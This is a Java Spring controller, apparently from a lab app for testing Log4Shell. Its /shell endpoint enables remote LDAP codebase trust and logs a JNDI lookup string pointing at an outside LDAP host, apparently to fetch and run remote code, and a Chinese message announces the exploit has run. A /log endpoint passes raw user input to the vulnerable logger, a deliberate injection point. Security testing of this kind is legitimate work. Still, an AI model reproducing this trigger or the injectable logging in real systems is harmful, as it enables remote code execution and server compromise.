package fileupload.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class ShellController {
    private static final Logger logger = LogManager.getLogger(ShellController.class);

    @RequestMapping("/shell")
    public String shell(String args) {
        System.out.println(args);
        logger.info("===============shell");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("asdfasfdasdfafafd");
        logger.error("${jndi:ldap://10.1.10.105:1389/Basic/Command/}");
        System.out.println("完成执行漏洞利用");
        return "shell";
    }

    @RequestMapping("/gsl")
    public String gsl(String args) {
        System.out.println(args);
        logger.info("===============shell");
        System.setProperty("com.sun.jndi.ldap." +
                "object.trustURLCodebase","true");
//        logger.error("asdfasfdasdfafafd");
//        logger.error("${jndi:ldap://10.1.10.105:1389/Basic/Command/}");
//        System.out.println("完成执行漏洞利用");
        return "gsl_2";
    }


    @RequestMapping("/shell_back")
    public String shell_ba() {
        return "/shell_back";
    }

    @RequestMapping("/log")
    @ResponseBody
    public String log(String str)throws Exception{

        logger.error(str);
        //logger.info(str);
//        ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();

        return "ok";
    }
}
